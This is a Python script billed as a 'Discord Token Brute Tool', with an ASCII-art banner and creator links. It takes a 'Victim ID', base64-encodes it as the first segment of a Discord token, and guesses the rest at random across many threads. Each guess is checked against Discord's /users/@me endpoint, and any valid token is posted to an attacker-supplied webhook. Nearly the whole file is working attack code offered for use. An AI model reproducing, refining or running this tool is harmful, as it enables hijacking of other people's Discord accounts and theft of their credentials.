from pystyle import Colors, Colorate, Center
import string
import requests
import json
import random
import threading
import base64
import time

ascii_art = """
                                                                                  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣫⣷⣶⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢉⡤⢰⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                
⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⡼⠋⠀⠀⠻⠿⠿⠿⠛⢉⣩⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                
⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡤⠈⠙⠻⢿⣿⡿⠋⠰⠿⠇⠀⠀⢀⣄⠀⠀⣀⠴⠿⠿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                
⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠈⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀                                
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠉⠀⠀⠀⠀⠀⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀┌──────────────────────────────┐
⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⢀⡠⠔⠒⣊⣉⣉⣉⣉⡒⠒⠒⠠⠤⠤⠤⠄⠀⡀⠀⠀⠀⠀⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀│  Made with love by 17xet!    │
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠁⣀⡤⢚⡥⣐⡺⠭⠍⠁⠠⣤⠄⠉⠉⠁⠀⢀⣀⣀⣉⣉⡉⠓⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀│                              │
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣾⣁⡔⡱⠋⠁⠀⠀⠀⠀⠀⠈⡇⠀⠀⠀⠀⢩⠆⠀⠀⠀⠈⢣⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀│ https://youtube.com/@17xet   │
⠀⠀⠀⠀⢸⠛⠛⢛⣛⡛⡿⠋⢁⡈⣠⡴⣾⣿⣿⡟⠓⠶⣤⡁⠀⠀⠀⠀⠼⣀⣤⣤⠤⣤⡈⠁⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀│ https://github.com/17xet     │
⠀⠀⠀⢀⣼⢶⠞⢙⣛⣛⣧⣈⠋⠀⠛⠒⠛⢛⣿⠛⠶⢤⣨⠟⠀⠀⠰⠶⣾⠿⠛⠓⠒⠚⠋⠈⠙⠋⢑⡮⣻⣆⠀⠀⠀⠀⠀⠀⠀⠀│ https://discord.gg/hKNW6wvyg3│
⠀⠀⠀⡿⠁⠇⣰⠟⠁⠀⡆⠉⠛⠷⠤⠤⠶⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⢠⣄⣠⡶⠾⠲⢶⢹⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀└──────────────────────────────┘
⠀⠀⢸⡇⠀⡀⣿⢀⣠⣴⠛⠶⢤⣄⡀⠀⠀⡠⠤⠤⠴⣴⠖⠂⠀⠀⠀⠀⠉⠻⣦⡄⠀⠉⠉⠁⣷⡀⠀⡸⢠⣱⡇⠀⠀⠀⠀⠀⠀⠀                                
⠀⠀⠈⢿⣄⢇⠸⡆⠀⠘⣧⣀⠀⠉⣿⠳⠶⣤⣀⡀⠈⢧⡼⠟⠛⠓⢀⡀⢀⣼⠟⠋⠓⠢⢀⣠⡿⣧⠨⠔⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀                                
⠀⠀⠀⠈⠻⣷⣍⠃⠀⠀⠘⣿⡻⢶⣾⣦⡀⠀⠀⠉⡿⠲⠶⠦⣤⣄⣀⣉⣉⣁⣀⣀⣠⠶⠛⡇⢷⣿⠀⢰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀                                
⠀⠀⠀⠀⠀⠈⢳⡀⠀⠀⠀⠘⢷⡄⣸⠙⠻⠿⣶⣦⣧⣀⣀⠀⠀⢸⠀⠀⢹⡏⠉⣀⣸⣇⣀⣷⣾⣿⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                
⠀⠀⠀⠀⠀⠀⠈⢷⡀⠀⠀⠀⠀⠹⢯⣀⠀⠀⠀⣹⠛⠛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                
⠀⠀⠀⠀⠀⠀⠀⠈⢿⣄⠀⠀⠀⠀⠀⠙⠳⣦⣠⠏⠀⠀⠀⠀⣿⠀⠈⠉⣹⠿⢄⣴⠟⠿⡇⡼⣹⠃⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣦⡉⠒⠭⣓⠦⣀⡉⠙⠲⠶⠦⢤⣿⣤⣤⣠⣏⣀⣴⣯⡶⢄⡈⢙⣧⣀⠀⠸⡇⠀⢀⣤⣶⣶⣤⣀⠀⠀                                
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡏⠉⠓⢤⣀⠉⠲⢭⣒⡦⠤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣉⠿⢤⣈⣳⣄⡇⢀⣿⣿⣿⣿⣿⣿⡆⠀                                
⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣧⠀⠀⢀⠈⠙⠲⣦⣀⠈⠉⠉⠒⠲⠿⠯⣍⣉⣉⣁⡉⠉⠉⣀⣀⠴⠋⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀                                
⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⡄⠘⣦⠓⢤⡀⠀⠉⠛⠶⣤⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡞⠁⠉⠛⠿⣿⣿⡿⠟⠀⠀                                
⢀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⣷⣤⡙⢦⡀⠀⠀⠀⠉⠉⠉⠙⠛⠶⠦⠤⣤⣀⣤⣤⣤⠴⠞⠋⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀                                
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⣈⠻⣝⢦⡙⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                
⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⠳⣌⡳⣌⠲⣬⡓⠦⡄⠀⠀⣀⡤⠄⢠⣄⢠⣟⡄⢸⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀                                
⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢀⡈⠳⣌⠳⢌⡙⠢⡀⢀⣼⡋⠀⠀⠀⢹⠀⠟⣡⢸⣿⣿⣿⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀                                
⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⠳⢄⠈⠳⣄⠙⠆⣰⡟⠈⢷⡄⠀⠀⢸⡇⠀⢃⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡀⠀                                
⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⡙⠢⡈⠓⠂⣿⡇⠀⠈⢿⣦⣄⠸⣝⢦⠈⠀⣿⣿⣿⣿⣿⣿⣿⣧⠀⠉⠙⠛⠿⠂                                
⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠙⠂⠀⣀⢀⣿⠇⠀⠀⣸⠛⣿⠀⠹⣷⡑⠀⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀                                
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠘⢁⡾⠋⠀⠀⠀⣿⠀⠘⠇⠀⠈⢿⣆⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀                                
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿⣆⠉⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀                                
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠛⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠘⣿⠻⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣦⡀⠀⢸⣇⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠿⢿⣿⢆⣸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀       
                                                                                  
"""

print(Colorate.Vertical(Colors.red_to_blue, Center.XCenter(ascii_art)))

BEFORE = f"{Colors.white}[INFO] "
AFTER = f"[END]{Colors.reset}"
RESET = Colors.reset
INFO = f"{Colors.white}[INFO] "
GEN_VALID = f"{Colors.green}[VALID]"
GEN_INVALID = f"{Colors.red}[INVALID]"
BEFORE_GREEN = Colors.green + "[INFO] "
AFTER_GREEN = "[END]" + Colors.reset
WHITE = Colors.white
RED = Colors.red
GREEN = Colors.green
YELLOW = Colors.yellow
BLUE = Colors.blue

color_webhook = 3447003
username_webhook = "Token Brute by 17xet"
avatar_webhook = "https://some-avatar-url.com/avatar.png"

def current_time_hour():
    return time.strftime("%H:%M:%S")

def ErrorModule(e):
    print(f"{RED}Error Module: {e}{RESET}")

def ErrorNumber():
    print(f"{RED}Error: Please enter a valid number.{RESET}")

def Error(e):
    print(f"{RED}Error: {e}{RESET}")
    exit()

def Title(title):
    print(f"\033]0;{title}\007")

def Slow(text):
    time.sleep(1)
    print(text)

def CheckWebhook(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"{GREEN}Webhook URL is valid.{RESET}")
        else:
            print(f"{RED}Invalid Webhook URL. Status code: {response.status_code}{RESET}")
    except requests.exceptions.RequestException as e:
        print(f"{RED}Error checking webhook: {e}{RESET}")

def Continue():
    print(f"{YELLOW}Continuing...{RESET}")

def Reset():
    print(f"{YELLOW}Resetting...{RESET}")

Title("Discord Token To Id")

try:
    Slow(f"{YELLOW}Loading Discord Token Brute Tool...{RESET}")

    userid = input(f"{BEFORE}{current_time_hour()}{AFTER} {INFO}Victim ID -> {RESET}")
    OnePartToken = str(base64.b64encode(userid.encode("utf-8")), "utf-8").replace("=", "")
    print(f"{BEFORE}{current_time_hour()}{AFTER} {INFO}Part One Token: {WHITE}{OnePartToken}{RESET}")

    brute = input(f"{BEFORE}{current_time_hour()}{AFTER} {INFO}Find the second part by brute force? (y/n) -> {RESET}")
    if brute.lower() not in ['y', 'yes']:
        Continue()
        Reset()

    webhook = input(f"{BEFORE}{current_time_hour()}{AFTER} {INFO}Webhook? (y/n) -> {RESET}")
    webhook_url = ""
    if webhook.lower() in ['y', 'yes']:
        webhook_url = input(f"{BEFORE}{current_time_hour()}{AFTER} {INFO}Webhook URL -> {RESET}")
        CheckWebhook(webhook_url)

    try:
        threads_number = int(input(f"{BEFORE}{current_time_hour()}{AFTER} {INFO}Threads Number -> {RESET}"))
    except ValueError:
        ErrorNumber()

    def send_webhook(embed_content):
        payload = {
            'embeds': [embed_content],
            'username': username_webhook,
            'avatar_url': avatar_webhook
        }
        headers = {'Content-Type': 'application/json'}
        try:
            requests.post(webhook_url, data=json.dumps(payload), headers=headers)
            print(f"{GREEN}Webhook sent successfully.{RESET}")
        except requests.exceptions.RequestException as e:
            print(f"{RED}Error sending webhook: {e}{RESET}")

    def token_check():
        first = OnePartToken
        second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(6))
        third = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(38))
        token = f"{first}.{second}.{third}"

        try:
            response = requests.get(
                'https://discord.com/api/v8/users/@me',
                headers={'Authorization': token, 'Content-Type': 'application/json'}
            )
            if response.status_code == 200:
                if webhook.lower() == 'y':
                    embed_content = {
                        'title': 'Token Valid!',
                        'description': f"**Token:**\n```{token}```",
                        'color': color_webhook,
                        'footer': {
                            "text": username_webhook,
                            "icon_url": avatar_webhook,
                        }
                    }
                    send_webhook(embed_content)
                print(f"{BEFORE_GREEN}{current_time_hour()}{AFTER_GREEN} {GEN_VALID} Status: {WHITE}Valid{GREEN}  Token: {WHITE}{token}{GREEN}")
            else:
                print(f"{BEFORE}{current_time_hour()}{AFTER} {GEN_INVALID} Status: {RED}Invalid{RESET}")
        except Exception as e:
            ErrorModule(e)

    threads = []
    for _ in range(threads_number):
        t = threading.Thread(target=token_check)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

except Exception as e:
    Error(e)
